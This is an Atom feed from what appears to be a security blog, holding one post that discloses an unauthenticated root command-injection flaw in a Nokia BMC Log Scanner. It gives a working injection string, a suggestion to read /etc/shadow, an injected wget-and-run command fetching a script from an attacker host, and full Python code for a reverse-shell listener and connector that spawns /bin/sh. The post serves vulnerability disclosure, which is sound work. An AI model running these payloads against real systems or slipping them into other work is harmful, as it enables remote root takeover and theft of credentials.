<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-01-18T15:59:52-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">zeskone</title><subtitle></subtitle><entry><title type="html">RCE in Nokia BMC Log Scanner</title><link href="http://localhost:4000/vulnerabilities/2024/01/17/vBMC_RCE.html" rel="alternate" type="text/html" title="RCE in Nokia BMC Log Scanner" /><published>2024-01-17T16:19:23-06:00</published><updated>2024-01-17T16:19:23-06:00</updated><id>http://localhost:4000/vulnerabilities/2024/01/17/vBMC_RCE</id><content type="html" xml:base="http://localhost:4000/vulnerabilities/2024/01/17/vBMC_RCE.html"><![CDATA[<p><br /></p>
<h1 id="rce-in-nokia-bmc-log-scanner">RCE in Nokia BMC Log Scanner</h1>

<h2 id="initial-command-execution">Initial Command Execution</h2>
<p>The BMC Log Scanner web application is vulnerable to command injection attacks, allowing for unauthenticated remote code execution. This vulnerability is especially significantbecause this service runs as root.</p>

<p>Steps to Reproduce:
In the Search Pattern field, type:</p>

<p><code>;";command</code><br />
Replacing the word “command” above with any Linux command.
Root access can be confirmed with the <code>id</code> command or any other command that would require
root access, such as displaying the contents of the <code>/etc/shadow</code> file.”</p>

<p><em>Demonstrating Initial Command Execution Entering the command injection string at the BMC Log Scanner GUI on a host:</em></p>
<image src="/images/01.png" width="75%"></image>
<p><br />
<em>The results of the id command showing that the service is running as the root user:</em></p>
<image src="/images/02.png"></image>
<p><br /></p>

<p><br /><br /></p>
<h2 id="from-a-db-host">From a DB Host</h2>
<p>Note that when recreating this scenario from one of the DB hosts, the commands run on both APP servers simultaneously.</p>

<p><em>Entering the command injection string at the BMC Log Scanner GUI on a DB host:</em></p>
<image src="/images/03.png"></image>

<p><br />
<em>The results of the command injection on DB-000 showing that it ran on both APP hosts:</em></p>
<image src="/images/04.png"></image>

<p><br />
<br /></p>
<h2 id="obtaining-a-root-level-shell">Obtaining a root Level Shell</h2>

<p>This vulnerability can also be used to initiate a reverse shell connection back to one of the Pilot hosts with no access required by the attacker besides being able to reach the web app. Since the service runs as root, the interactive shell has root privileges on the App host. The process for this is slightly more involved and requires the following steps:</p>

<ul>
  <li>Write a Python script that will open a port and listen for a connection. Store that on a Pilot host.</li>
  <li>Start the listener on the Pilot host.</li>
  <li>Write a Python script that will connect to a listener for a reverse shell and store that on a Pilot host.</li>
  <li>Start a Python web host on the Pilot host.</li>
  <li>Enter the following command injection code on the BMC Log Scanner:
    <ul>
      <li><code> ;";wget 192.168.64.9:8000/connector.py -O /tmp/connector.py;python /tmp/connector.py</code></li>
      <li>The code above will cause the APP server to connect back to the Pilot server to pick up the connector.py script and then run the connector.py script.</li>
    </ul>
  </li>
</ul>

<p>The process can be seen below:</p>

<p>Running the listener using the Python3 binary available on the system:</p>
<image src="/images/05.png"></image>
<p><br />
Running the web server:</p>
<image src="/images/06.png"></image>
<p><br /></p>

<p>Entering the command - in this case, the web page simply hung at this screen:</p>
<image src="/images/07.png"></image>
<p><br /></p>

<p>And the listener received a connection. The id and ip a commands were run after the connection was established to confirm the machine that the shell was opened from:</p>
<image src="/images/08.png"></image>
<p><br /></p>

<h2 id="references">References:</h2>

<p>The code for the Python3 listener is below:</p>
<pre>
<code>import socket, sys, time
​def listen(ip,port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((ip, port))
    s.listen(1)
    print("Listening on port " + str(port))
    conn, addr = s.accept()
    print('Connection received from ',addr)
    ​while True:
        #Receive data from the target and get user input
        ans = conn.recv(1024).decode()
        sys.stdout.write(ans)
        command = input()
        #Send command
        command += "\n"
        conn.send(command.encode())
        time.sleep(1)
        #Remove the output of the "input()" function
        sys.stdout.write("\033[A" + ans.split("\n")[-1])
listen("0.0.0.0",8001)
The code for connecting to the listener is below:
import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("192.168.64.9",8001));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);
</code>
</pre>]]></content><author><name></name></author><category term="Vulnerabilities" /><summary type="html"><![CDATA[RCE in Nokia BMC Log Scanner]]></summary></entry></feed>